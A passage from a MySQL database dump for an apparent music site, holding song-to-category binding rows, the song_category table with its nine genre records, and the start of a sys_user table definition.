INSERT INTO `song_bind_song_category` VALUES (154, 52, 2, '2018-08-24 13:00:21', '2018-08-24 13:00:21');
INSERT INTO `song_bind_song_category` VALUES (155, 52, 1, '2018-08-24 13:00:21', '2018-08-24 13:00:21');
INSERT INTO `song_bind_song_category` VALUES (156, 53, 2, '2018-08-24 13:03:56', '2018-08-24 13:03:56');
INSERT INTO `song_bind_song_category` VALUES (157, 53, 1, '2018-08-24 13:03:56', '2018-08-24 13:03:56');
INSERT INTO `song_bind_song_category` VALUES (158, 54, 2, '2018-08-24 13:05:48', '2018-08-24 13:05:48');
INSERT INTO `song_bind_song_category` VALUES (159, 54, 1, '2018-08-24 13:05:48', '2018-08-24 13:05:48');
INSERT INTO `song_bind_song_category` VALUES (160, 55, 2, '2018-08-24 13:07:34', '2018-08-24 13:07:34');
INSERT INTO `song_bind_song_category` VALUES (164, 56, 1, '2018-08-24 13:09:35', '2018-08-24 13:09:35');
INSERT INTO `song_bind_song_category` VALUES (165, 56, 3, '2018-08-24 13:09:35', '2018-08-24 13:09:35');
INSERT INTO `song_bind_song_category` VALUES (166, 56, 5, '2018-08-24 13:09:35', '2018-08-24 13:09:35');
INSERT INTO `song_bind_song_category` VALUES (167, 57, 1, '2018-08-24 13:11:09', '2018-08-24 13:11:09');
INSERT INTO `song_bind_song_category` VALUES (168, 57, 2, '2018-08-24 13:11:09', '2018-08-24 13:11:09');
INSERT INTO `song_bind_song_category` VALUES (169, 58, 3, '2018-08-24 13:12:59', '2018-08-24 13:12:59');
INSERT INTO `song_bind_song_category` VALUES (170, 59, 3, '2018-08-24 13:14:36', '2018-08-24 13:14:36');
INSERT INTO `song_bind_song_category` VALUES (171, 59, 1, '2018-08-24 13:14:36', '2018-08-24 13:14:36');
INSERT INTO `song_bind_song_category` VALUES (172, 60, 3, '2018-08-24 13:16:20', '2018-08-24 13:16:20');
INSERT INTO `song_bind_song_category` VALUES (173, 60, 1, '2018-08-24 13:16:20', '2018-08-24 13:16:20');
INSERT INTO `song_bind_song_category` VALUES (174, 60, 5, '2018-08-24 13:16:20', '2018-08-24 13:16:20');
INSERT INTO `song_bind_song_category` VALUES (175, 61, 1, '2018-08-24 13:17:56', '2018-08-24 13:17:56');
INSERT INTO `song_bind_song_category` VALUES (176, 61, 2, '2018-08-24 13:17:56', '2018-08-24 13:17:56');
INSERT INTO `song_bind_song_category` VALUES (177, 62, 1, '2018-08-24 13:19:08', '2018-08-24 13:19:08');
INSERT INTO `song_bind_song_category` VALUES (178, 62, 2, '2018-08-24 13:19:08', '2018-08-24 13:19:08');
INSERT INTO `song_bind_song_category` VALUES (179, 63, 2, '2018-08-24 13:24:35', '2018-08-24 13:24:35');
INSERT INTO `song_bind_song_category` VALUES (180, 63, 1, '2018-08-24 13:24:35', '2018-08-24 13:24:35');
INSERT INTO `song_bind_song_category` VALUES (181, 64, 1, '2018-08-24 13:26:05', '2018-08-24 13:26:05');
INSERT INTO `song_bind_song_category` VALUES (182, 64, 3, '2018-08-24 13:26:05', '2018-08-24 13:26:05');
INSERT INTO `song_bind_song_category` VALUES (183, 65, 2, '2018-08-24 13:27:11', '2018-08-24 13:27:11');
INSERT INTO `song_bind_song_category` VALUES (187, 67, 1, '2018-08-24 13:30:52', '2018-08-24 13:30:52');
INSERT INTO `song_bind_song_category` VALUES (188, 67, 9, '2018-08-24 13:30:52', '2018-08-24 13:30:52');
INSERT INTO `song_bind_song_category` VALUES (189, 67, 7, '2018-08-24 13:30:52', '2018-08-24 13:30:52');
INSERT INTO `song_bind_song_category` VALUES (190, 68, 3, '2018-08-24 13:32:57', '2018-08-24 13:32:57');
INSERT INTO `song_bind_song_category` VALUES (191, 69, 9, '2018-08-24 13:34:46', '2018-08-24 13:34:46');
INSERT INTO `song_bind_song_category` VALUES (192, 70, 9, '2018-08-24 13:35:50', '2018-08-24 13:35:50');
INSERT INTO `song_bind_song_category` VALUES (193, 70, 7, '2018-08-24 13:35:50', '2018-08-24 13:35:50');
INSERT INTO `song_bind_song_category` VALUES (194, 70, 1, '2018-08-24 13:35:50', '2018-08-24 13:35:50');
INSERT INTO `song_bind_song_category` VALUES (195, 71, 7, '2018-08-24 13:37:28', '2018-08-24 13:37:28');
INSERT INTO `song_bind_song_category` VALUES (196, 71, 6, '2018-08-24 13:37:28', '2018-08-24 13:37:28');
INSERT INTO `song_bind_song_category` VALUES (197, 66, 1, '2018-08-24 13:38:03', '2018-08-24 13:38:03');
INSERT INTO `song_bind_song_category` VALUES (198, 66, 6, '2018-08-24 13:38:03', '2018-08-24 13:38:03');
INSERT INTO `song_bind_song_category` VALUES (199, 66, 7, '2018-08-24 13:38:03', '2018-08-24 13:38:03');
INSERT INTO `song_bind_song_category` VALUES (200, 66, 9, '2018-08-24 13:38:03', '2018-08-24 13:38:03');
INSERT INTO `song_bind_song_category` VALUES (201, 72, 3, '2018-08-24 13:39:29', '2018-08-24 13:39:29');
INSERT INTO `song_bind_song_category` VALUES (202, 73, 9, '2018-08-24 13:40:31', '2018-08-24 13:40:31');
INSERT INTO `song_bind_song_category` VALUES (206, 74, 1, '2018-08-24 13:43:04', '2018-08-24 13:43:04');
INSERT INTO `song_bind_song_category` VALUES (207, 74, 3, '2018-08-24 13:43:04', '2018-08-24 13:43:04');
INSERT INTO `song_bind_song_category` VALUES (208, 75, 2, '2018-08-24 13:44:45', '2018-08-24 13:44:45');
INSERT INTO `song_bind_song_category` VALUES (209, 75, 1, '2018-08-24 13:44:45', '2018-08-24 13:44:45');
INSERT INTO `song_bind_song_category` VALUES (210, 75, 8, '2018-08-24 13:44:45', '2018-08-24 13:44:45');
INSERT INTO `song_bind_song_category` VALUES (211, 76, 8, '2018-08-24 13:46:45', '2018-08-24 13:46:45');
INSERT INTO `song_bind_song_category` VALUES (212, 76, 7, '2018-08-24 13:46:45', '2018-08-24 13:46:45');
INSERT INTO `song_bind_song_category` VALUES (214, 5, 1, '2018-08-24 13:49:17', '2018-08-24 13:49:17');
INSERT INTO `song_bind_song_category` VALUES (215, 5, 3, '2018-08-24 13:49:17', '2018-08-24 13:49:17');
INSERT INTO `song_bind_song_category` VALUES (216, 5, 5, '2018-08-24 13:49:17', '2018-08-24 13:49:17');
INSERT INTO `song_bind_song_category` VALUES (217, 77, 3, '2018-08-24 13:49:51', '2018-08-24 13:49:51');
INSERT INTO `song_bind_song_category` VALUES (218, 77, 5, '2018-08-24 13:49:51', '2018-08-24 13:49:51');
INSERT INTO `song_bind_song_category` VALUES (219, 78, 3, '2018-08-24 13:51:14', '2018-08-24 13:51:14');
INSERT INTO `song_bind_song_category` VALUES (220, 78, 5, '2018-08-24 13:51:14', '2018-08-24 13:51:14');
INSERT INTO `song_bind_song_category` VALUES (221, 78, 1, '2018-08-24 13:51:14', '2018-08-24 13:51:14');
INSERT INTO `song_bind_song_category` VALUES (222, 79, 3, '2018-08-24 13:52:14', '2018-08-24 13:52:14');
INSERT INTO `song_bind_song_category` VALUES (223, 79, 5, '2018-08-24 13:52:14', '2018-08-24 13:52:14');
INSERT INTO `song_bind_song_category` VALUES (224, 79, 1, '2018-08-24 13:52:14', '2018-08-24 13:52:14');
INSERT INTO `song_bind_song_category` VALUES (225, 80, 3, '2018-08-24 14:12:04', '2018-08-24 14:12:04');
INSERT INTO `song_bind_song_category` VALUES (226, 80, 5, '2018-08-24 14:12:04', '2018-08-24 14:12:04');
INSERT INTO `song_bind_song_category` VALUES (227, 81, 4, '2018-08-24 14:13:32', '2018-08-24 14:13:32');
INSERT INTO `song_bind_song_category` VALUES (228, 81, 1, '2018-08-24 14:13:32', '2018-08-24 14:13:32');
INSERT INTO `song_bind_song_category` VALUES (229, 81, 7, '2018-08-24 14:13:32', '2018-08-24 14:13:32');
INSERT INTO `song_bind_song_category` VALUES (230, 82, 7, '2018-08-24 14:14:51', '2018-08-24 14:14:51');
INSERT INTO `song_bind_song_category` VALUES (231, 82, 2, '2018-08-24 14:14:51', '2018-08-24 14:14:51');
INSERT INTO `song_bind_song_category` VALUES (232, 83, 3, '2018-08-24 14:15:59', '2018-08-24 14:15:59');
INSERT INTO `song_bind_song_category` VALUES (233, 84, 3, '2018-08-24 14:17:01', '2018-08-24 14:17:01');
INSERT INTO `song_bind_song_category` VALUES (234, 84, 5, '2018-08-24 14:17:01', '2018-08-24 14:17:01');
INSERT INTO `song_bind_song_category` VALUES (235, 85, 6, '2018-08-24 14:18:00', '2018-08-24 14:18:00');
INSERT INTO `song_bind_song_category` VALUES (236, 85, 7, '2018-08-24 14:18:00', '2018-08-24 14:18:00');
INSERT INTO `song_bind_song_category` VALUES (237, 85, 9, '2018-08-24 14:18:00', '2018-08-24 14:18:00');
INSERT INTO `song_bind_song_category` VALUES (238, 86, 7, '2018-08-24 14:19:15', '2018-08-24 14:19:15');
INSERT INTO `song_bind_song_category` VALUES (239, 87, 8, '2018-08-24 14:20:30', '2018-08-24 14:20:30');
INSERT INTO `song_bind_song_category` VALUES (240, 87, 5, '2018-08-24 14:20:30', '2018-08-24 14:20:30');
INSERT INTO `song_bind_song_category` VALUES (241, 87, 3, '2018-08-24 14:20:30', '2018-08-24 14:20:30');
INSERT INTO `song_bind_song_category` VALUES (242, 87, 1, '2018-08-24 14:20:30', '2018-08-24 14:20:30');
INSERT INTO `song_bind_song_category` VALUES (248, 90, 7, '2018-08-24 14:25:22', '2018-08-24 14:25:22');
INSERT INTO `song_bind_song_category` VALUES (249, 90, 5, '2018-08-24 14:25:22', '2018-08-24 14:25:22');
INSERT INTO `song_bind_song_category` VALUES (250, 91, 5, '2018-08-24 14:26:07', '2018-08-24 14:26:07');
INSERT INTO `song_bind_song_category` VALUES (251, 91, 3, '2018-08-24 14:26:07', '2018-08-24 14:26:07');
INSERT INTO `song_bind_song_category` VALUES (252, 89, 7, '2018-08-24 14:26:31', '2018-08-24 14:26:31');
INSERT INTO `song_bind_song_category` VALUES (253, 92, 9, '2018-08-24 14:27:31', '2018-08-24 14:27:31');
INSERT INTO `song_bind_song_category` VALUES (254, 92, 7, '2018-08-24 14:27:31', '2018-08-24 14:27:31');
INSERT INTO `song_bind_song_category` VALUES (255, 92, 6, '2018-08-24 14:27:31', '2018-08-24 14:27:31');
INSERT INTO `song_bind_song_category` VALUES (256, 92, 1, '2018-08-24 14:27:31', '2018-08-24 14:27:31');
INSERT INTO `song_bind_song_category` VALUES (259, 93, 1, '2018-08-24 14:29:45', '2018-08-24 14:29:45');
INSERT INTO `song_bind_song_category` VALUES (260, 93, 7, '2018-08-24 14:29:45', '2018-08-24 14:29:45');
INSERT INTO `song_bind_song_category` VALUES (261, 93, 9, '2018-08-24 14:29:45', '2018-08-24 14:29:45');
INSERT INTO `song_bind_song_category` VALUES (262, 94, 7, '2018-08-24 14:31:25', '2018-08-24 14:31:25');
INSERT INTO `song_bind_song_category` VALUES (263, 94, 9, '2018-08-24 14:31:25', '2018-08-24 14:31:25');
INSERT INTO `song_bind_song_category` VALUES (264, 95, 8, '2018-08-24 14:32:09', '2018-08-24 14:32:09');
INSERT INTO `song_bind_song_category` VALUES (265, 95, 7, '2018-08-24 14:32:09', '2018-08-24 14:32:09');
INSERT INTO `song_bind_song_category` VALUES (266, 96, 3, '2018-08-24 14:33:03', '2018-08-24 14:33:03');
INSERT INTO `song_bind_song_category` VALUES (267, 96, 5, '2018-08-24 14:33:03', '2018-08-24 14:33:03');
INSERT INTO `song_bind_song_category` VALUES (268, 97, 2, '2018-08-24 14:34:03', '2018-08-24 14:34:03');
INSERT INTO `song_bind_song_category` VALUES (269, 98, 2, '2018-08-24 14:35:37', '2018-08-24 14:35:37');
INSERT INTO `song_bind_song_category` VALUES (273, 99, 9, '2018-08-24 14:37:23', '2018-08-24 14:37:23');
INSERT INTO `song_bind_song_category` VALUES (274, 100, 1, '2018-08-24 14:38:17', '2018-08-24 14:38:17');
INSERT INTO `song_bind_song_category` VALUES (275, 100, 7, '2018-08-24 14:38:17', '2018-08-24 14:38:17');
INSERT INTO `song_bind_song_category` VALUES (276, 100, 8, '2018-08-24 14:38:17', '2018-08-24 14:38:17');
INSERT INTO `song_bind_song_category` VALUES (279, 101, 2, '2018-08-24 14:45:14', '2018-08-24 14:45:14');
INSERT INTO `song_bind_song_category` VALUES (280, 102, 2, '2018-08-24 14:46:51', '2018-08-24 14:46:51');
INSERT INTO `song_bind_song_category` VALUES (281, 103, 3, '2018-08-24 14:48:30', '2018-08-24 14:48:30');
INSERT INTO `song_bind_song_category` VALUES (282, 103, 1, '2018-08-24 14:48:30', '2018-08-24 14:48:30');
INSERT INTO `song_bind_song_category` VALUES (283, 104, 9, '2018-08-24 14:50:48', '2018-08-24 14:50:48');
INSERT INTO `song_bind_song_category` VALUES (284, 105, 1, '2018-08-24 14:51:54', '2018-08-24 14:51:54');
INSERT INTO `song_bind_song_category` VALUES (285, 105, 3, '2018-08-24 14:51:54', '2018-08-24 14:51:54');
INSERT INTO `song_bind_song_category` VALUES (286, 106, 3, '2018-08-24 14:52:55', '2018-08-24 14:52:55');
INSERT INTO `song_bind_song_category` VALUES (287, 106, 5, '2018-08-24 14:52:55', '2018-08-24 14:52:55');
INSERT INTO `song_bind_song_category` VALUES (288, 107, 7, '2018-08-24 14:54:25', '2018-08-24 14:54:25');
INSERT INTO `song_bind_song_category` VALUES (289, 107, 8, '2018-08-24 14:54:25', '2018-08-24 14:54:25');
INSERT INTO `song_bind_song_category` VALUES (290, 108, 1, '2018-08-24 14:55:27', '2018-08-24 14:55:27');
INSERT INTO `song_bind_song_category` VALUES (291, 108, 2, '2018-08-24 14:55:27', '2018-08-24 14:55:27');
INSERT INTO `song_bind_song_category` VALUES (292, 109, 1, '2018-08-24 14:57:05', '2018-08-24 14:57:05');
INSERT INTO `song_bind_song_category` VALUES (293, 109, 7, '2018-08-24 14:57:05', '2018-08-24 14:57:05');
INSERT INTO `song_bind_song_category` VALUES (294, 109, 8, '2018-08-24 14:57:05', '2018-08-24 14:57:05');
INSERT INTO `song_bind_song_category` VALUES (295, 110, 2, '2018-08-24 15:00:38', '2018-08-24 15:00:38');
INSERT INTO `song_bind_song_category` VALUES (296, 110, 1, '2018-08-24 15:00:38', '2018-08-24 15:00:38');
INSERT INTO `song_bind_song_category` VALUES (297, 111, 7, '2018-08-24 15:01:30', '2018-08-24 15:01:30');
INSERT INTO `song_bind_song_category` VALUES (300, 112, 1, '2018-08-24 15:03:21', '2018-08-24 15:03:21');
INSERT INTO `song_bind_song_category` VALUES (301, 112, 6, '2018-08-24 15:03:21', '2018-08-24 15:03:21');
INSERT INTO `song_bind_song_category` VALUES (302, 112, 7, '2018-08-24 15:03:21', '2018-08-24 15:03:21');
INSERT INTO `song_bind_song_category` VALUES (303, 112, 9, '2018-08-24 15:03:21', '2018-08-24 15:03:21');
INSERT INTO `song_bind_song_category` VALUES (304, 113, 5, '2018-08-24 15:05:14', '2018-08-24 15:05:14');
INSERT INTO `song_bind_song_category` VALUES (305, 113, 3, '2018-08-24 15:05:14', '2018-08-24 15:05:14');
INSERT INTO `song_bind_song_category` VALUES (306, 114, 9, '2018-08-24 15:06:10', '2018-08-24 15:06:10');
INSERT INTO `song_bind_song_category` VALUES (307, 114, 7, '2018-08-24 15:06:10', '2018-08-24 15:06:10');
INSERT INTO `song_bind_song_category` VALUES (308, 115, 3, '2018-08-24 15:06:59', '2018-08-24 15:06:59');
INSERT INTO `song_bind_song_category` VALUES (309, 115, 5, '2018-08-24 15:06:59', '2018-08-24 15:06:59');
INSERT INTO `song_bind_song_category` VALUES (310, 116, 3, '2018-08-24 15:08:22', '2018-08-24 15:08:22');
INSERT INTO `song_bind_song_category` VALUES (311, 116, 1, '2018-08-24 15:08:22', '2018-08-24 15:08:22');
INSERT INTO `song_bind_song_category` VALUES (312, 117, 3, '2018-08-24 15:09:43', '2018-08-24 15:09:43');
INSERT INTO `song_bind_song_category` VALUES (313, 117, 1, '2018-08-24 15:09:43', '2018-08-24 15:09:43');
INSERT INTO `song_bind_song_category` VALUES (314, 118, 7, '2018-08-24 15:11:20', '2018-08-24 15:11:20');
INSERT INTO `song_bind_song_category` VALUES (315, 119, 3, '2018-08-24 15:12:04', '2018-08-24 15:12:04');
INSERT INTO `song_bind_song_category` VALUES (316, 120, 1, '2018-08-24 15:13:11', '2018-08-24 15:13:11');
INSERT INTO `song_bind_song_category` VALUES (317, 120, 2, '2018-08-24 15:13:11', '2018-08-24 15:13:11');
INSERT INTO `song_bind_song_category` VALUES (318, 121, 2, '2018-08-24 15:14:54', '2018-08-24 15:14:54');
INSERT INTO `song_bind_song_category` VALUES (319, 121, 1, '2018-08-24 15:14:54', '2018-08-24 15:14:54');
INSERT INTO `song_bind_song_category` VALUES (320, 122, 9, '2018-08-24 15:16:24', '2018-08-24 15:16:24');
INSERT INTO `song_bind_song_category` VALUES (321, 122, 7, '2018-08-24 15:16:24', '2018-08-24 15:16:24');
INSERT INTO `song_bind_song_category` VALUES (322, 123, 8, '2018-08-24 15:17:16', '2018-08-24 15:17:16');
INSERT INTO `song_bind_song_category` VALUES (323, 123, 7, '2018-08-24 15:17:16', '2018-08-24 15:17:16');
INSERT INTO `song_bind_song_category` VALUES (324, 124, 7, '2018-08-24 15:18:17', '2018-08-24 15:18:17');
INSERT INTO `song_bind_song_category` VALUES (325, 124, 6, '2018-08-24 15:18:17', '2018-08-24 15:18:17');
INSERT INTO `song_bind_song_category` VALUES (326, 125, 7, '2018-08-24 15:19:46', '2018-08-24 15:19:46');
INSERT INTO `song_bind_song_category` VALUES (327, 125, 6, '2018-08-24 15:19:46', '2018-08-24 15:19:46');
INSERT INTO `song_bind_song_category` VALUES (328, 125, 1, '2018-08-24 15:19:46', '2018-08-24 15:19:46');
INSERT INTO `song_bind_song_category` VALUES (329, 125, 5, '2018-08-24 15:19:46', '2018-08-24 15:19:46');
INSERT INTO `song_bind_song_category` VALUES (330, 126, 7, '2018-08-24 15:20:22', '2018-08-24 15:20:22');
INSERT INTO `song_bind_song_category` VALUES (331, 126, 3, '2018-08-24 15:20:22', '2018-08-24 15:20:22');
INSERT INTO `song_bind_song_category` VALUES (332, 126, 5, '2018-08-24 15:20:22', '2018-08-24 15:20:22');
INSERT INTO `song_bind_song_category` VALUES (333, 127, 1, '2018-08-24 15:22:18', '2018-08-24 15:22:18');
INSERT INTO `song_bind_song_category` VALUES (334, 127, 3, '2018-08-24 15:22:18', '2018-08-24 15:22:18');
INSERT INTO `song_bind_song_category` VALUES (335, 128, 1, '2018-08-24 15:23:13', '2018-08-24 15:23:13');
INSERT INTO `song_bind_song_category` VALUES (336, 128, 7, '2018-08-24 15:23:13', '2018-08-24 15:23:13');
INSERT INTO `song_bind_song_category` VALUES (337, 128, 4, '2018-08-24 15:23:13', '2018-08-24 15:23:13');
INSERT INTO `song_bind_song_category` VALUES (338, 129, 1, '2018-08-24 15:24:44', '2018-08-24 15:24:44');
INSERT INTO `song_bind_song_category` VALUES (339, 129, 7, '2018-08-24 15:24:44', '2018-08-24 15:24:44');
INSERT INTO `song_bind_song_category` VALUES (340, 129, 4, '2018-08-24 15:24:44', '2018-08-24 15:24:44');
INSERT INTO `song_bind_song_category` VALUES (341, 130, 6, '2018-08-24 15:26:38', '2018-08-24 15:26:38');
INSERT INTO `song_bind_song_category` VALUES (342, 130, 7, '2018-08-24 15:26:38', '2018-08-24 15:26:38');
INSERT INTO `song_bind_song_category` VALUES (343, 131, 2, '2018-08-24 15:28:17', '2018-08-24 15:28:17');
INSERT INTO `song_bind_song_category` VALUES (344, 132, 3, '2018-08-24 15:29:11', '2018-08-24 15:29:11');
INSERT INTO `song_bind_song_category` VALUES (345, 132, 5, '2018-08-24 15:29:11', '2018-08-24 15:29:11');
INSERT INTO `song_bind_song_category` VALUES (346, 133, 2, '2018-08-24 15:30:30', '2018-08-24 15:30:30');
INSERT INTO `song_bind_song_category` VALUES (347, 134, 6, '2018-08-24 15:31:18', '2018-08-24 15:31:18');
INSERT INTO `song_bind_song_category` VALUES (348, 134, 7, '2018-08-24 15:31:18', '2018-08-24 15:31:18');
INSERT INTO `song_bind_song_category` VALUES (353, 135, 1, '2018-08-24 15:33:05', '2018-08-24 15:33:05');
INSERT INTO `song_bind_song_category` VALUES (354, 135, 3, '2018-08-24 15:33:05', '2018-08-24 15:33:05');
INSERT INTO `song_bind_song_category` VALUES (355, 135, 5, '2018-08-24 15:33:05', '2018-08-24 15:33:05');
INSERT INTO `song_bind_song_category` VALUES (358, 136, 1, '2018-08-24 15:34:17', '2018-08-24 15:34:17');
INSERT INTO `song_bind_song_category` VALUES (359, 136, 4, '2018-08-24 15:34:17', '2018-08-24 15:34:17');
INSERT INTO `song_bind_song_category` VALUES (360, 136, 7, '2018-08-24 15:34:17', '2018-08-24 15:34:17');
INSERT INTO `song_bind_song_category` VALUES (361, 137, 3, '2018-08-24 15:35:28', '2018-08-24 15:35:28');
INSERT INTO `song_bind_song_category` VALUES (362, 138, 7, '2018-08-24 15:37:06', '2018-08-24 15:37:06');
INSERT INTO `song_bind_song_category` VALUES (363, 138, 6, '2018-08-24 15:37:06', '2018-08-24 15:37:06');
INSERT INTO `song_bind_song_category` VALUES (364, 139, 3, '2018-08-24 15:38:12', '2018-08-24 15:38:12');
INSERT INTO `song_bind_song_category` VALUES (365, 140, 3, '2018-08-24 15:40:16', '2018-08-24 15:40:16');
INSERT INTO `song_bind_song_category` VALUES (366, 140, 1, '2018-08-24 15:40:16', '2018-08-24 15:40:16');
INSERT INTO `song_bind_song_category` VALUES (367, 141, 6, '2018-08-24 15:41:12', '2018-08-24 15:41:12');
INSERT INTO `song_bind_song_category` VALUES (368, 141, 7, '2018-08-24 15:41:12', '2018-08-24 15:41:12');
INSERT INTO `song_bind_song_category` VALUES (369, 141, 1, '2018-08-24 15:41:12', '2018-08-24 15:41:12');
INSERT INTO `song_bind_song_category` VALUES (370, 142, 1, '2018-08-24 15:42:36', '2018-08-24 15:42:36');
INSERT INTO `song_bind_song_category` VALUES (371, 142, 2, '2018-08-24 15:42:36', '2018-08-24 15:42:36');
INSERT INTO `song_bind_song_category` VALUES (372, 143, 1, '2018-08-24 15:43:57', '2018-08-24 15:43:57');
INSERT INTO `song_bind_song_category` VALUES (373, 143, 2, '2018-08-24 15:43:57', '2018-08-24 15:43:57');
INSERT INTO `song_bind_song_category` VALUES (374, 144, 9, '2018-08-24 15:45:09', '2018-08-24 15:45:09');
INSERT INTO `song_bind_song_category` VALUES (375, 144, 7, '2018-08-24 15:45:09', '2018-08-24 15:45:09');
INSERT INTO `song_bind_song_category` VALUES (376, 145, 9, '2018-08-24 15:46:21', '2018-08-24 15:46:21');
INSERT INTO `song_bind_song_category` VALUES (377, 145, 7, '2018-08-24 15:46:21', '2018-08-24 15:46:21');
INSERT INTO `song_bind_song_category` VALUES (378, 146, 9, '2018-08-24 15:47:06', '2018-08-24 15:47:06');
INSERT INTO `song_bind_song_category` VALUES (379, 146, 7, '2018-08-24 15:47:06', '2018-08-24 15:47:06');
INSERT INTO `song_bind_song_category` VALUES (380, 147, 6, '2018-08-24 15:48:02', '2018-08-24 15:48:02');
INSERT INTO `song_bind_song_category` VALUES (381, 147, 7, '2018-08-24 15:48:02', '2018-08-24 15:48:02');
INSERT INTO `song_bind_song_category` VALUES (382, 147, 1, '2018-08-24 15:48:02', '2018-08-24 15:48:02');
INSERT INTO `song_bind_song_category` VALUES (383, 148, 1, '2018-08-24 17:11:59', '2018-08-24 17:11:59');
INSERT INTO `song_bind_song_category` VALUES (384, 148, 2, '2018-08-24 17:11:59', '2018-08-24 17:11:59');
INSERT INTO `song_bind_song_category` VALUES (385, 149, 1, '2018-08-24 17:15:23', '2018-08-24 17:15:23');
INSERT INTO `song_bind_song_category` VALUES (386, 149, 2, '2018-08-24 17:15:23', '2018-08-24 17:15:23');
INSERT INTO `song_bind_song_category` VALUES (387, 150, 1, '2018-08-24 17:17:08', '2018-08-24 17:17:08');
INSERT INTO `song_bind_song_category` VALUES (388, 150, 2, '2018-08-24 17:17:08', '2018-08-24 17:17:08');
INSERT INTO `song_bind_song_category` VALUES (389, 151, 3, '2018-08-24 17:19:40', '2018-08-24 17:19:40');
INSERT INTO `song_bind_song_category` VALUES (390, 151, 5, '2018-08-24 17:19:40', '2018-08-24 17:19:40');
INSERT INTO `song_bind_song_category` VALUES (391, 152, 1, '2018-08-24 17:21:15', '2018-08-24 17:21:15');
INSERT INTO `song_bind_song_category` VALUES (392, 152, 2, '2018-08-24 17:21:15', '2018-08-24 17:21:15');
INSERT INTO `song_bind_song_category` VALUES (393, 153, 1, '2018-08-24 17:22:05', '2018-08-24 17:22:05');
INSERT INTO `song_bind_song_category` VALUES (394, 153, 2, '2018-08-24 17:22:05', '2018-08-24 17:22:05');
INSERT INTO `song_bind_song_category` VALUES (395, 154, 1, '2018-08-24 17:23:42', '2018-08-24 17:23:42');
INSERT INTO `song_bind_song_category` VALUES (396, 154, 2, '2018-08-24 17:23:42', '2018-08-24 17:23:42');
INSERT INTO `song_bind_song_category` VALUES (400, 156, 2, '2018-08-24 17:30:35', '2018-08-24 17:30:35');
INSERT INTO `song_bind_song_category` VALUES (401, 156, 1, '2018-08-24 17:30:35', '2018-08-24 17:30:35');
INSERT INTO `song_bind_song_category` VALUES (402, 157, 6, '2018-08-24 17:32:21', '2018-08-24 17:32:21');
INSERT INTO `song_bind_song_category` VALUES (403, 157, 7, '2018-08-24 17:32:21', '2018-08-24 17:32:21');
INSERT INTO `song_bind_song_category` VALUES (404, 157, 9, '2018-08-24 17:32:21', '2018-08-24 17:32:21');
INSERT INTO `song_bind_song_category` VALUES (405, 157, 1, '2018-08-24 17:32:21', '2018-08-24 17:32:21');
INSERT INTO `song_bind_song_category` VALUES (410, 158, 1, '2018-08-24 17:34:07', '2018-08-24 17:34:07');
INSERT INTO `song_bind_song_category` VALUES (411, 158, 2, '2018-08-24 17:34:07', '2018-08-24 17:34:07');
INSERT INTO `song_bind_song_category` VALUES (412, 158, 8, '2018-08-24 17:34:07', '2018-08-24 17:34:07');
INSERT INTO `song_bind_song_category` VALUES (413, 159, 2, '2018-08-24 17:35:04', '2018-08-24 17:35:04');
INSERT INTO `song_bind_song_category` VALUES (414, 160, 2, '2018-08-24 17:36:36', '2018-08-24 17:36:36');
INSERT INTO `song_bind_song_category` VALUES (415, 160, 1, '2018-08-24 17:36:36', '2018-08-24 17:36:36');
INSERT INTO `song_bind_song_category` VALUES (416, 161, 1, '2018-08-24 17:38:02', '2018-08-24 17:38:02');
INSERT INTO `song_bind_song_category` VALUES (417, 161, 3, '2018-08-24 17:38:02', '2018-08-24 17:38:02');
INSERT INTO `song_bind_song_category` VALUES (418, 4, 1, '2018-08-24 17:40:08', '2018-08-24 17:40:08');
INSERT INTO `song_bind_song_category` VALUES (419, 4, 3, '2018-08-24 17:40:08', '2018-08-24 17:40:08');
INSERT INTO `song_bind_song_category` VALUES (420, 88, 3, '2018-08-28 19:05:15', '2018-08-28 19:05:15');
INSERT INTO `song_bind_song_category` VALUES (421, 88, 5, '2018-08-28 19:05:15', '2018-08-28 19:05:15');
INSERT INTO `song_bind_song_category` VALUES (422, 162, 1, '2018-09-24 21:57:26', '2018-09-24 21:57:26');
INSERT INTO `song_bind_song_category` VALUES (423, 162, 3, '2018-09-24 21:57:26', '2018-09-24 21:57:26');
INSERT INTO `song_bind_song_category` VALUES (424, 163, 1, '2019-01-14 10:43:42', '2019-01-14 10:43:42');
INSERT INTO `song_bind_song_category` VALUES (425, 163, 6, '2019-01-14 10:43:42', '2019-01-14 10:43:42');
INSERT INTO `song_bind_song_category` VALUES (426, 163, 7, '2019-01-14 10:43:42', '2019-01-14 10:43:42');

-- ----------------------------
-- Table structure for song_category
-- ----------------------------
DROP TABLE IF EXISTS `song_category`;
CREATE TABLE `song_category`  (
  `id` int(0) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT '歌曲分类主键id',
  `name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '分类名称',
  `desc` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '分类描述',
  `create_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0),
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 10 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of song_category
-- ----------------------------
INSERT INTO `song_category` VALUES (1, '推荐', '', '2018-08-17 13:06:48');
INSERT INTO `song_category` VALUES (2, '欧美', '', '2018-08-17 13:06:53');
INSERT INTO `song_category` VALUES (3, '日文', '', '2018-08-17 15:58:11');
INSERT INTO `song_category` VALUES (4, '乐器', '', '2018-08-23 20:01:18');
INSERT INTO `song_category` VALUES (5, '动漫', '', '2018-08-23 20:03:18');
INSERT INTO `song_category` VALUES (6, '轻快纯音', '', '2018-08-23 20:04:15');
INSERT INTO `song_category` VALUES (7, '纯音', '', '2018-08-18 11:12:44');
INSERT INTO `song_category` VALUES (8, '燃系', '', '2018-08-23 19:55:45');
INSERT INTO `song_category` VALUES (9, '电音', '', '2018-08-23 19:57:33');

-- ----------------------------
-- Table structure for sys_user
-- ----------------------------
DROP TABLE IF EXISTS `sys_user`;
CREATE TABLE `sys_user`  (
  `id` int(0) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT '后台用户主键id',
  `user_id` int(0) NOT NULL COMMENT '前台的用户id',
  `username` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '用户名称,用于登陆,后台用户没有昵称',
  `password` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '用户密码',
